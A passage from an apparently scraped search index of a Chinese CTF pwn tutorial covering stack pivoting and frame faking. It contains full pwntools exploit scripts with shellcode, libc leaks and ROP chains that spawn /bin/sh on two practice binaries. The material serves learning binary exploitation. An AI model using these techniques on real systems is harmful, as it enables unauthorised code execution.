PWN\u4e4bcanary\u9a9a\u64cd\u4f5c","title":"\u53c2\u8003\u8d44\u6599"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/","text":"\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7 \u00b6 stack pivoting \u00b6 \u539f\u7406 \u00b6 \u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884c ROP\u3002 eip \u7684\u503c\u662f\u901a\u8fc7 esp \u4e0e ret \u6307\u4ee4\u538b\u5165\u3002\u9000\u51fa\u51fd\u6570\u65f6\uff0c\u5148\u6267\u884c leave \uff0c\u8ba9 esp \u6307\u5411 ebp \uff0c\u7136\u540e esp \u52a0\u4e00\u4e2a\u673a\u5668\u5b57\u957f\u540e\uff0c\u6267\u884c ret \u6307\u4ee4\uff0c\u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528 stack pivoting \u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684 ROP \u94fe \u5f00\u542f\u4e86 PIE \u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002 \u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5728\u5806\u4e0a\u5199 rop \u53ca\u8fdb\u884c\u5806\u6f0f\u6d1e\u5229\u7528 \u4f7f\u7528\u6761\u4ef6 \u00b6 \u5229\u7528 stack pivoting \u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42 \u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002 \u53ef\u4ee5\u63a7\u5236 sp \u6307\u9488\uff08\u6808\u9876\u6307\u9488\uff09\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528 ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684 gadgets \u4e00\u822c\u662f pop rsp/esp \u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4 libc_csu_init \u4e2d\u7684 gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236 rsp \u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002 \u53ea\u6709\u662f\u7528\u5230\u4e86 libc \uff0c\u7f16\u8bd1\u65f6 gcc \u4f1a\u5c06 libc_csu_init \u52a0\u5230\u7a0b\u5e8f\u91cc\u3002\u7531\u8fd9\u4e2a\u51fd\u6570\u4e5f\u5ef6\u4f38\u4e86\u4e00\u79cd ROP \u6280\u5de7\uff1aret2cus gef\u27a4 x/7i 0x000000000040061a 0x40061a <__libc_csu_init+90>: pop rbx 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__libc_csu_init+100>: ret gef\u27a4 x/7i 0x000000000040061d 0x40061d <__libc_csu_init+93>: pop rsp 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__libc_csu_init+100>: ret \u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b bss \u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9 bss \u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875 (4k\uff0c0x1000) \u5927\u5c0f\u3002\u7136\u800c\u4e00\u822c bss \u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14 bss \u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002 heap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002 \u793a\u4f8b \u00b6 \u4ee5 X-CTF Quals 2016 - b0verfl0w \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542f NX \u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff1a signed int vul () { char s ; // [sp+18h] [bp-20h]@1 puts ( \" \\n ======================\" ); puts ( \" \\n Welcome to X-CTF 2016!\" ); puts ( \" \\n ======================\" ); puts ( \"What's your name?\" ); fflush ( stdout ); fgets ( & s , 50 , stdin ); printf ( \"Hello %s.\" , & s ); fflush ( stdout ); return 1 ; } \u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u6709 50-0x20-4=14 \u4e2a\u5b57\u8282\u3002 \u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6e shellcode \u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6e shellcode \u63a7\u5236 eip \u6307\u5411 shellcode \u5904 \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542f ASLR \u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053 shellcode \u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a**\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684**\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9 esp \u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411 shellcode \u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3 esp \u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230 esp \u5904\u7684 gadgets \u4e86\u3002 \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 ROPgadget --binary b0verfl0w --only 'jmp|ret' Gadgets information ============================================================ 0x08048504 : jmp esp 0x0804836a : ret 0x0804847e : ret 0xeac1 Unique gadgets found: 3 \u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230 esp \u7684 gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6e payload \u5982\u4e0b shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp \u90a3\u4e48\u6211\u4eec payload \u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6e esp \u5462\uff0c\u53ef\u4ee5\u77e5\u9053 size(shellcode+padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 \u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f sub esp,0x28 jmp esp \u6240\u4ee5\u6700\u540e\u7684 exp \u5982\u4e0b from pwn import * sh = process('./b0verfl0w') shellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\" shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\" shellcode_x86 += \"\\x0b\\xcd\\x80\" sub_esp_jmp = asm('sub esp, 0x28;jmp esp') jmp_esp = 0x08048504 payload = shellcode_x86 + ( 0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp sh.sendline(payload) sh.interactive() \u8fd9\u91cc\u8865\u5145\u4e00\u4e0b\u5177\u4f53\u7a0b\u5e8f\u8fc7\u7a0b\uff1a payload \u7ed3\u6784\u5982\u4e0b\uff1a shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp \u9996\u5148\u5c31\u662f\u5199\u5165 shellcode \u3001\u586b\u5145\u3001\u8986\u76d6 ebp \uff1b \u5c06 eip \u8986\u76d6\u4e3a jmp esp \uff1beip \u662f\u4e0b\u4e00\u6761\u6307\u4ee4\u5b58\u50a8\u5bc4\u5b58\u5668\u3002\u5f53\u7a0b\u5e8f\u8fd0\u884c jmp esp \u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd0\u884c\u6307\u9488\u5c06\u4ece text \u6bb5\u8f6c\u79fb\u5230\u6808\u4e0a\uff0c\u5c06\u6808\u4e0a\u7684\u6570\u636e\u5f53\u505a\u4ee3\u7801\u6307\u4ee4\u8fd0\u884c\u3002\u8fd9\u6837\u64cd\u4f5c\u4e4b\u540e\uff0c set esp point to shellcode and jmp esp \u8fd9\u4e00\u90e8\u5206\u6808\u6570\u636e\u88ab\u5f53\u505a\u662f\u4ee3\u7801\u6307\u4ee4\u6267\u884c\u4e86\u3002 sub esp,0x28;jmp esp \uff1b\u5c06 esp \u8c03\u6574\u5230 shellcode \u7684\u5f00\u59cb\uff0c\u5f53\u524d esp \u548cshellcode \u7684\u8ba1\u7b97\u770b\u524d\u9762\uff1b\u7136\u540e\u518d\u4e00\u6b21 jmp esp \uff0c\u5c06\u8fd0\u884c\u6307\u9488\u8c03\u6574\u5230 shellcode \u3002 frame faking \u00b6 \u4e5f\u5c31\u662f\u6808\u8fc1\u79fb \u539f\u7406 \u00b6 \u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f \u63a7\u5236\u7a0b\u5e8f EIP \u63a7\u5236\u7a0b\u5e8f EBP \u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728 frame faking \u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236 EBP \u4e0e EIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176 payload \u5982\u4e0b buffer padding|fake ebp|leave ret addr| \u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8bb2\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206 \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884c leave ret \u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684 leave ret \u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21 leave ret\u3002 \u5176\u4e2d fake ebp \u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b fake ebp | v ebp2|target function addr|leave ret addr|arg1|arg2 \u8fd9\u91cc\u6211\u4eec\u7684 fake ebp \u6307\u5411 ebp2\uff0c\u5373\u5b83\u4e3a ebp2 \u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002 leave \u6307\u4ee4\u76f8\u5f53\u4e8e mov esp, ebp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp pop ebp # \u5f39\u51faebp \u63a7\u5236\u8fc7\u7a0b \u00b6 \u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\uff1a \u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884c leave \u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 mov esp, ebp \uff0c\u8fd9\u4f1a\u5c06 esp \u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684 ebp \u57fa\u5730\u5740\u5904\u3002 pop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684 fake ebp \u7684\u503c\u8d4b\u7ed9 ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp \u4fbf\u6307\u5411\u4e86 ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86 ebp2 \u6240\u5728\u7684\u5730\u5740\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884c\uff08\u6ea2\u51fa\u5199\u5165\u7684\uff09 leave ret \u6307\u4ee4\u3002 \u6267\u884c leave \u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 mov esp, ebp \uff0c\u8fd9\u4f1a\u5c06 esp \u6307\u5411 ebp2\u3002 pop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06 ebp \u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3a ebp2 \u7684\u503c\uff0c\u540c\u65f6 esp \u4f1a\u6307\u5411 target function\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c target function\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c push ebp\uff0c\u4f1a\u5c06 ebp2 \u503c\u538b\u5165\u6808\u4e2d\uff0c mov ebp, esp\uff0c\u5c06 ebp \u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002 \u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b ebp | v ebp2|leave ret addr|arg1|arg2 \u5f53\u7a0b\u5e8f\u6267\u884c\u65f6\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002 \u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728 ebp2 \u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u53ef\u4ee5\u770b\u51fa\u5728 fake frame \u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0e stack pivoting \u76f8\u4f3c\uff08\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u6808\u4e0a\u5730\u5740\uff09\u3002 \u4f8b\u9898 \u00b6 2018 \u5b89\u6052\u676f over \u00b6 \u9898\u76ee\u53ef\u4ee5\u5728 ctf-challenge \u4e2d\u627e\u5230 \u5206\u6790 \u00b6 \u6587\u4ef6\u4fe1\u606f \u00b6 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f, \u6ca1\u6709\u5f00 PIE \u548c canary \u4fdd\u62a4, \u4f46\u5f00\u4e86 NX \u4fdd\u62a4 \u6f0f\u6d1e\u51fd\u6570 \u00b6 __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { setvbuf ( stdin , 0L L , 2 , 0L L ); setvbuf ( stdout , 0L L , 2 , 0L L ); while ( sub_400676 () ) ; return 0L L ; } int sub_400676 () { char buf [ 80 ]; // [rsp+0h] [rbp-50h] memset ( buf , 0 , sizeof ( buf )); putchar ( '>' ); read ( 0 , buf , 96uLL ); return puts ( buf ); } read \u80fd\u8bfb\u5165 96 \u4f4d, \u4f46 buf \u7684\u957f\u5ea6\u53ea\u6709 80, \u56e0\u6b64\u53ea\u80fd\u8986\u76d6 rbp \u4ee5\u53ca ret addr \u6765\u8fdb\u884c rop \u4e86 \u601d\u8def \u00b6 \u5f53\u6808\u6ea2\u51fa\u957f\u5ea6\u4e0d\u591f\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5 frame faking \uff08\u6808\u8fc1\u79fb\uff09\u3002\u8fd9\u5c31\u9700\u8981\u4e00\u4e2a\u80fd\u88ab\u6211\u4eec\u5199\u5165\u3001\u77e5\u9053\u5730\u5740\u7684\u5185\u5b58\u3002\u8fd9\u6761\u9898\u76ee\u7684\u8bdd\uff0c\u6211\u4eec\u53ea\u80fd\u5f80\u6808\u4e0a\u5199\u5165\u6570\u636e\uff0c\u6240\u4ee5\u60f3\u529e\u6cd5\u6cc4\u9732\u6808\u5730\u5740\u3002 leak stack addr \u00b6 \u6808\u5730\u5740\u6bcf\u6b21\u8fd0\u884c\u90fd\u4e0d\u4e00\u6837\uff0c\u9700\u8981\u63a7\u5236\u7a0b\u5e8f\u6765\u6cc4\u9732\u6808\u5730\u5740\u3002\u8fd9\u6761\u9898\u76ee\u6ca1\u6709\u5f00 canary \uff0c\u7136\u540e\u5728 IDA \u6216\u8005 gdb \u5206\u6790 sub_400676 \u7684\u6808\u7ed3\u6784\uff0c\u53d1\u73b0 buf \u8986\u76d6 80 \u5b57\u8282\u4e4b\u540e\uff0c\u5c31\u5230 rbp \u9876\uff0c\u8bfb\u5165\u7684 read \u4e5f\u6ca1\u6709\u7ed9\u5b57\u7b26\u4e32\u672b\u5c3e\u63a5\u4e0a \\x00 \u7684\u7ed3\u675f\u7b26\uff0c\u6240\u4ee5\u53ef\u4ee5\u5c06 ebp \u7684\u503c\u6cc4\u9732\u51fa\u6765\u3002 ebp \u7684\u503c\u662f\u4e0a\u4e00\u4e2a\u6808\u7684\u6808\u9876\uff0c\u6cc4\u9732\u4e4b\u540e\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u5f97\u5230 buf \u5199\u5165\u7684\u6808\u5730\u5740\u3002gdb \u8c03\u8bd5\u540e\uff0c\u5f97\u51fa\u504f\u79fb\u4e3a 0x70 # leak ebp p . sendafter ( \">\" , 'A' * 0x50 ) stack = u64 ( p . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 log . info ( \"stack:\" + hex ( stack )) leak libc \u00b6 \u7136\u540e\u5c31\u662f\u6784\u9020 ROP \u94fe\uff0c\u56e0\u4e3a\u53ef\u63a7\u5199\u5165\u662f\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u6784\u9020\u5982\u4e0b\uff1a ROP|padding|fake ebp|leave ret addr| leave ret addr \u5c31\u7528 ROPgadget \u627e\u4e00\u4e0b\uff1a ~$ ROPgadget --binary over.over --only 'leave|ret' Gadgets information ============================================================ 0x00000000004006be : leave ; ret 0x0000000000400509 : ret 0x00000000004007d0 : ret 0xfffe fake ebp \u586b\u5165 buf \u7684\u771f\u5b9e\u5730\u5740\u3002 ROP \u4e24\u4e2a\u529f\u80fd\uff1a\u6cc4\u9732 libc \u5730\u5740\u3001ret2text\u3002\u6cc4\u9732\u5730\u5740\u5c31\u7528\u5e38\u89c4\u7684 puts \u51fd\u6570\u3002 # leak libc payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( puts_got ) + p64 ( puts_plt ) payload += p64 ( sub_addr ) # ret2text payload = payload . ljust ( 0x50 , 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret ) getshell \u00b6 \u6cc4\u9732\u5730\u5740\u4e4b\u540e\u5c31\u518d\u4e00\u6b21 frame faking \uff0c\u53ea\u4e0d\u8fc7\u8fd9\u6b21\u662f\u6267\u884c system(\"/bin/sh\") \u3002 \u4f46\u662f\u5982\u679c fake ebp \u4f9d\u65e7\u586b\u5199\u539f\u503c\u4f1a\u62a5\u9519\uff0c\u5927\u6982\u539f\u56e0\u662f\u56e0\u4e3a\u4e0a\u9762 ROP \u662f\u76f4\u63a5\u8c03\u7528 sub_400676 \uff0c\u60f3\u6bd4\u6b63\u5e38\u60c5\u51b5\u4e0b\u538b\u6808\u7684\u6570\u91cf\u548c\u539f\u6765\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u8981\u91cd\u65b0\u8ba1\u7b97\u504f\u79fb\u3002 fake ebp \u4f7f\u7528 ROP1 \u7684\u503c\u65f6\uff1a pwndbg> 0x00000000004006be in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500 \u2026\u2026\u2026\u2026 RBP 0x7fffffffdd50 \u2014\u25b8 0x7fffffffdd30 \u25c2\u2014 0x6161616161616161 ( 'aaaaaaaa' ) RSP 0x7fffffffdd00 \u25c2\u2014 0xdeadbeef RIP 0x4006be \u25c2\u2014 leave \u53ef\u4ee5\u770b\u5230 RBP \u7ecf\u8fc7\u4e24\u6b21 leave|ret \u4e4b\u540e\u6307\u5411\u7684\u662f aaaaaaaa \uff0c\u6b63\u5e38\u5e94\u8be5\u662f\u6307\u5411 0xdeadbeef \u3002 \u4e3a\u4e86\u8ba9\u7a0b\u5e8f\u6267\u884c\u6b63\u786e\u5730\u65b9\uff0c\u5c06 fake ebp \u7684\u503c\u51cf 0x30 \uff0c\u8ba9 ebp \u91cd\u65b0\u6307\u5411 0xdeadbeef \uff1a pwndbg> x /20gx 0x7fffffffdd30-0x30 0x7fffffffdd00: 0x00000000deadbeef 0x0000000000400793 0x7fffffffdd10: 0x00007ffff7b99d57 0x00007ffff7a52390 0x7fffffffdd20: 0x0000000000400676 0x6161616161616161 0x7fffffffdd30: 0x6161616161616161 0x6161616161616161 0x7fffffffdd40: 0x6161616161616161 0x6161616161616161 0x7fffffffdd50: 0x00007fffffffdd30 0x00000000004006be 0x7fffffffdd60: 0x6161616161616161 0x6161616161616161 0x7fffffffdd70: 0x6161616161616161 0x6161616161616161 0x7fffffffdd80: 0x00007fffffffdd30 0x00000000004006be 0x7fffffffdd90: 0x00007fffffffde88 0x0000000100000000 payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( binsh_addr ) + p64 ( system_addr ) payload += p64 ( sub_addr ) # ret2text payload = payload.ljust ( 0x50, 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret ) exp \u00b6 system('/bin/sh') from pwn import * context . log_level = 'debug' p = process ( \"./over.over\" ) elf = ELF ( \"./over.over\" ) libc = elf . libc pop_rdi = 0x400793 leave_ret = 0x4006be puts_plt = elf . plt [ 'puts' ] puts_got = elf . got [ 'puts' ] sub_addr = 0x400676 # leak ebp p . sendafter ( \">\" , 'A' * 0x50 ) stack = u64 ( p . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 log . info ( \"stack:\" + hex ( stack )) # leak libc payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( puts_got ) + p64 ( puts_plt ) payload += p64 ( sub_addr ) # ret2text payload = payload . ljust ( 0x50 , 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret ) p . sendafter ( \">\" , payload ) libc_base = u64 ( p . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] log . success ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] log . success ( \"system_addr:\" + hex ( system_addr )) binsh_addr = libc_base + libc . search ( '/bin/sh' ) . next () log . success ( \"binsh_addr:\" + hex ( binsh_addr )) # system('/bin/sh') payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( binsh_addr ) + p64 ( system_addr ) payload += p64 ( sub_addr ) # ret2text payload = payload . ljust ( 0x50 , 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret ) gdb . attach ( p ) p . sendafter ( \">\" , payload ) p . interactive () execve(\"/bin/sh\", 0, 0) from pwn import * context . binary = \"./over.over\" def DEBUG ( cmd ): raw_input ( \"DEBUG: \" ) gdb . attach ( io , cmd ) io = process ( \"./over.over\" ) elf = ELF ( \"./over.over\" ) libc = elf . libc io . sendafter ( \">\" , 'a' * 80 ) stack = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 success ( \"stack -> {:#x} \" . format ( stack )) # DEBUG(\"b *0x4006B9\\nc\") io . sendafter ( \">\" , flat ([ '11111111' , 0x400793 , elf . got [ 'puts' ], elf . plt [ 'puts' ], 0x400676 , ( 80 - 40 ) * '1' , stack , 0x4006be ])) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] success ( \"libc.address -> {:#x} \" . format ( libc . address )) pop_rdi_ret = 0x400793 ''' $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \"pop|ret\" 0x00000000000f5279 : pop rdx ; pop rsi ; ret ''' pop_rdx_pop_rsi_ret = libc . address + 0xf5279 payload = flat ([ '22222222' , pop_rdi_ret , next ( libc . search ( \"/bin/sh\" )), pop_rdx_pop_rsi_ret , p64 ( 0 ), p64 ( 0 ), libc . sym [ 'execve' ], ( 80 - 7 * 8 ) * '2' , stack - 0x30 , 0x4006be ]) io . sendafter ( \">\" , payload ) io . interactive () Stack smash \u00b6 \u539f\u7406 \u00b6 \u5728\u7a0b\u5e8f\u52a0\u4e86 canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5f53 canary \u503c\u53d8\u5316\u540e\uff0c\u7a0b\u5e8f\u4f1a\u9519\u8bef\u9000\u51fa\u5e76\u63d0\u793a\u9519\u8bef\u4fe1\u606f\uff0c\u901a\u5e38\u662f\u8bf4 xxx\uff08\u7a0b\u5e8f\u540d\uff09 \u6bb5\u9519\u8bef\u3002 stack smash \u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u542f\u52a8 canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0 canary \u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c __stack_chk_fail \u51fd\u6570\u6765\u6253\u5370 argv[0] 